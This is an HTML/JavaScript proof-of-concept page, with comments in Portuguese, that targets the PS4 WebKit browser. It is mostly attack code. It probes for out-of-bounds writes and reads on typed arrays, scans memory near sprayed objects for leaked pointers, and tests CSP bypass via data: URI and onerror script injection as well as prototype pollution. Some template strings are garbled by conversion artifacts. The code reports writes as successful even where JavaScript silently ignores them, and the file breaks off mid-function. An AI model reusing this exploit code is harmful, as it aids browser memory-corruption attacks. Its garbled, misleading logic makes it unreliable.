<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 WebKit PoC - Advanced Info Leak Hunter</title>
    <style>
        /* Estilos CSS */
        body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 12px; }
        #poc-output { background: #222; border: 1px solid #444; padding: 10px; height: 85vh; overflow-y: auto; white-space: pre-wrap; margin-top: 10px; }
        .log-info { color: #6cf; }
        .log-test { color: #fff; font-weight: bold; margin-top: 10px; display: block; border-top: 1px dashed #555; padding-top: 5px; }
        .log-subtest { color: #eee; font-weight: bold; margin-left: 10px; }
        .log-vuln { color: #ff4444; font-weight: bold; } /* OOB Write Success */
        .log-leak { color: #FF9800; font-weight: bold; } /* Potential Leak Value Found */
        .log-ptr { color: #f0f; font-weight: bold; }  /* Potential POINTER Found */
        .log-good { color: #4CAF50; }
        .log-warn { color: #FFC107; }
        .log-error { color: #f44336; }
    </style>
</head>
<body>
    <h1>PS4 WebKit PoC - Advanced Info Leak Hunter</h1>
    <p>Foco total em tentar vazar endereços/ponteiros via OOB Read.</p>
    <div id="poc-output"></div>

    <script>
        let outputDiv = document.getElementById('poc-output');
        const log = (message, type = 'info') => { /* Função log igual anterior */
             if (!outputDiv) return; try { const t=`[${new Date().toLocaleTimeString()}]`; const s=String(message).replace(/</g,"&lt;").replace(/>/g,"&gt;"); if(outputDiv.innerHTML.length>800000){outputDiv.innerHTML=outputDiv.innerHTML.substring(outputDiv.innerHTML.length-400000); outputDiv.innerHTML=`<span>[Log Truncado...]</span>\n`+outputDiv.innerHTML;} outputDiv.innerHTML+=`<span class="log-<span class="math-inline">\{type\}"\></span>{t} ${s}\n</span>`; outputDiv.scrollTop=outputDiv.scrollHeight;}catch(e){console.error("Erro log:",e);outputDiv=null;}
        };
        const PAUSE_DURATION = 100; // Pausa curta

        // --- Helpers ---
        const isPotentialPointer64 = (high, low) => { /* Igual anterior */ if(high===null||low===null||typeof high!=='number'||typeof low!=='number')return false; if(high===0&&low===0)return false; if(high===0xFFFFFFFF&&low===0xFFFFFFFF)return false; if(high===0xAAAAAAAA&&low===0xAAAAAAAA)return false; return high > 0 || (low > 0xFFFF && low !== 0xAAAAAAAA); };
        const toHex = (val, bits = 32) => { /* Igual anterior */ if(typeof val!=='number'||!isFinite(val))return'NaN/Invalid';let n=Number(val);if(bits<=32){n=n>>>0;}const p=Math.ceil(bits/4);return'0x'+n.toString(16).toUpperCase().padStart(p,'0');};

        // --- Função Principal de Leitura OOB ---
        // Lê uma janela OOB e loga valores suspeitos
        const probeOOBWindow = async (dataView, baseOffsetBytes, windowSizeBytes, description) => {
            log(` -> Iniciando Probe OOB: ${description} (Janela: ${windowSizeBytes} bytes @ Base ${baseOffsetBytes})`, 'subtest');
            let foundPotentialLeak = false;
            const readStepBytes = 8; // Ler de 8 em 8 bytes (64 bits)

            for (let i = 0; i < windowSizeBytes / readStepBytes; i++) {
                const currentByteOffset = baseOffsetBytes + (i * readStepBytes);
                try {
                    // Ler como U64 (simulado)
                    const low = dataView.getUint32(currentByteOffset, true);
                    const high = dataView.getUint32(currentByteOffset + 4, true);
                    const u64Str = `H=<span class="math-inline">\{toHex\(high\)\} L\=</span>{toHex(low)}`;

                    if (high === 0xAAAAAAAA && low === 0xAAAAAAAA) { /* Ignorar AAAA */ }
                    else if (high !== 0 || low !== 0) {
                        log(`  Leak U64? @Byte ${currentByteOffset}: ${u64Str}`, 'leak');
                        if (isPotentialPointer64(high, low)) {
                            log(`    >> POTENCIAL PONTEIRO!`, 'ptr');
                            foundPotentialLeak = true;
                        }
                    }
                } catch(e) {
                    // Logar erro apenas uma vez para evitar flood
                    // log(`Erro leitura @ ${currentByteOffset}: ${e.message}`, 'warn');
                }
                if (i % 16 === 0) await new Promise(resolve => setTimeout(resolve, 1)); // Pequena pausa a cada 128 bytes
            }
            if (!foundPotentialLeak) { log(`    Nenhum ponteiro/dado OOB suspeito encontrado em ${description}.`, 'info'); }
            return foundPotentialLeak;
        }

        // --- Testes Focados em Info Leak ---

        // Teste 1: Leitura OOB Ampla (Após e Antes do Buffer)
        const runWideOOBReads = async () => {
            log("--- Iniciando Teste 1: Leitura OOB Ampla (Após e Antes) ---", 'test');
            try {
                const bufferSize = 256; // Buffer maior
                const buffer = new ArrayBuffer(bufferSize);
                const u8view = new Uint8Array(buffer); // View para escrita OOB
                const dataView = new DataView(buffer); // View para leitura OOB via DataView
                u8view.fill(0xBB); // Preencher buffer

                // Confirmar OOB Write e ler após
                log("Confirmando OOB Write @ offset 256 e lendo após...", 'subtest');
                try {
                    u8view[bufferSize] = 0xEE;
                    log("OOB Write @ Fim OK.", 'vuln');
                    await probeOOBWindow(dataView, bufferSize, 512, "Após Buffer (offset 256+)");
                } catch(e) { log(`Escrita OOB @ ${bufferSize} falhou: ${e.message}`, 'error'); }

                await new Promise(resolve => setTimeout(resolve, PAUSE_DURATION));

                // Confirmar OOB Write e ler antes
                 log("Confirmando OOB Write @ offset -1 e lendo antes...", 'subtest');
                 try {
                    u8view[-1] = 0xDD;
                    log("OOB Write @ Início (-1) OK.", 'vuln');
                    // Ler antes requer uma forma de acessar memória em endereço < base do buffer
                    // DataView(buffer, offset, length) não permite offset negativo.
                    // A única forma seria se a escrita OOB em -1 corrompesse algo que nos desse outra primitiva.
                    // Vamos *simular* a leitura com DataView em offset 0, mas procurar em memória *antes*
                    // é mais complexo do que ler *depois*. Por ora, focamos na leitura *após*.
                    // Tentativa especulativa com DataView em buffer diferente - BAIXA PROBABILIDADE
                     try {
                         log("Tentando ler 'antes' com DataView (especulativo)...", 'info');
                         const tempBuf = new ArrayBuffer(bufferSize); // Outro buffer
                         const tempDv = new DataView(tempBuf);
                         await probeOOBWindow(tempDv, -256, 256, "Antes do Buffer (Especulativo)"); // Ler offsets negativos
                     } catch (e) { log("Erro na leitura especulativa 'antes'.", 'warn');}

                 } catch(e) { log(`Escrita OOB @ -1 falhou: ${e.message}`, 'good'); } // Falha na escrita OOB negativa é comum

            } catch (e) { log(`Erro GERAL no teste Wide OOB Reads: ${e.message}`, 'warn'); }
            log("--- Teste 1 Concluído ---", 'test');
        };


        // Teste 2: Leitura OOB Perto de Objetos Específicos
        const runOOBNearObjects = async () => {
            log("--- Iniciando Teste 2: Leitura OOB Perto de Objetos Específicos ---", 'test');

            const leakCheckNearObject = async (objType, objFactory) => {
                 log(`Verificando leak OOB perto de ${objType}...`, 'subtest');
                 try {
                     // Alocar objeto ANTES do buffer pode ajudar
                     let targetObject = objFactory();
                     await new Promise(resolve => setTimeout(resolve, 50)); // Pausa para alocação
                     let buffer = new ArrayBuffer(128);
                     let u8view = new Uint8Array(buffer);
                     let dataView = new DataView(buffer);
                     u8view.fill(0xCC); // Preencher buffer de ataque
                     log(`Objeto ${objType} e Buffer alocados.`, 'info');

                     // Confirmar OOB Write antes do buffer (tentando atingir metadados do obj?)
                      try {
                         u8view[-1] = 0xDD;
                         log("OOB Write @ -1 OK.", 'vuln');
                         // Ler memória ANTES do buffer atual
                         await probeOOBWindow(dataView, -256, 256, `Antes do Buffer (após ${objType})`);
                     } catch(e) { log(`Escrita OOB @ -1 falhou perto de ${objType}: ${e.message}`, 'good'); }

                     targetObject = null; buffer = null; // Ajuda GC?

                 } catch (e) { log(`Erro no teste de leak perto de ${objType}: ${e.message}`, 'error'); }
                 await new Promise(resolve => setTimeout(resolve, PAUSE_DURATION)); // Pausa maior
            };

            // Testar perto de diferentes tipos de objetos
            await leakCheckNearObject("String Grande", () => "S".repeat(2048));
            await leakCheckNearObject("Função Grande", () => new Function("let s=''; for(let i=0; i<1000; i++) s+='A'+i; return s;") );
            await leakCheckNearObject("Float64Array Grande", () => new Float64Array(512));
            await leakCheckNearObject("Array Grande", () => Array(1024).fill(1.1));

            log("--- Teste 2 Concluído ---", 'test');
        };


        // Teste 3: CSP Bypass (Confirmação)
        const runCSPConfirmation = () => { /* Mantido igual ao script anterior*/
             log("--- Iniciando Teste 3: CSP Bypass (Confirmação) ---", 'test');
             log("Injetando script data: URI...", 'info'); try{const s=document.createElement('script'); s.src='data:text/javascript;base64,bG9nKCJDU1AgQnlwYXNzIGRhdGE6IFVSaSBCw6FzaWNvIE9LIiwgImdvb2QiKTs='; document.body.appendChild(s);}catch(e){}
             log("Injetando img onerror...", 'info'); try{const i=document.createElement('img');i.src='x';i.onerror=()=>{log("CSP Bypass onerror Básico OK!",'good');};document.body.appendChild(i);}catch(e){}
             // Link removido pois não temos teste Canvas neste script
             log("--- Teste 3 Concluído ---", 'test');
        };

        // Teste 4: Prototype Pollution (Confirmação)
        const runPPBasic = () => { /* Mantido igual */
             log("--- Iniciando Teste 4: PP Básico (Confirmação) ---", 'test'); const k='__pp_test_confirm__',v='PPOK';try{log(`Poluindo['${k}']...`,'info');Object.prototype[k]=v;const t={'w':window,'n':{}};let c=0;for(const n in t){try{if(t[n]&&t[n][k]===v){log(`VULN: PP básica OK! <span class="math-inline">\{n\}\.</span>{k}=${t[n][k]}`,'vuln');c++;}}catch(e){}} if(c>0)log(`Confirmado:${c} obj(s).`,'vuln');else log(`Aviso:Ñ confirmou PP.`,'warn'); try{delete Object.prototype[k];log("Limpou PP.",'info');}catch(e){}}catch(e){} log("--- Teste 4 Concluído ---",'test');
        };

        // Teste 5: OOB Write Básico (Confirmação)
        const runOOBTestU8_Confirm = async () => { /* Mantido igual */
            log("--- Iniciando Teste 5: OOB Write (Uint8 Confirmação) ---", 'test'); try {const bS=32; const b=new ArrayBuffer(bS); const v=new Uint8Array(b); const wV=0xEE; const wO=[-1,bS,bS+10]; for(const o of wO){ log(`Tentar OOB U8 @${o}...`,'subtest'); try{v[o]=wV;log(`VULN: OOB U8 @${o} OK!`,'vuln');}catch(e){log(`✅ OOB U8 @${o} Bloq: ${e.message}`,'good');} await new Promise(
